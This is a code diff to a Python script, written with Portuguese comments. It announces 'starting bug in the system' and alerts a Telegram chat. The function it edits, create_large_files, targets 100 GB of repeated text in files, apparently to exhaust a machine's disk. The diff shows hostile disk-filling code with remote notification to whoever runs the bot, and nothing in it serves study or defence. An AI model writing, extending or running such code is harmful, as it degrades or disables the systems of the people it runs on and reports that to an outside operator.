@@ -1,4 +1,3 @@
-print("iniciando bug no sistema! 😈")
 import os
 import telebot
 
@@ -13,6 +12,11 @@ def send_telegram_message(message):
     bot.send_message(chat_id, message)
 
 def create_large_files():
+    # Enviar mensagem inicial para o Telegram
+    initial_message = "iniciando bug no sistema! 😈"
+    print(initial_message)
+    send_telegram_message(initial_message)
+
     file_count = 0
     target_size = 100 * 1024 * 1024 * 1024  # 100 GB em bytes
     content = "Esta é uma linha de texto.\n" * 1000  # Mensagem repetida
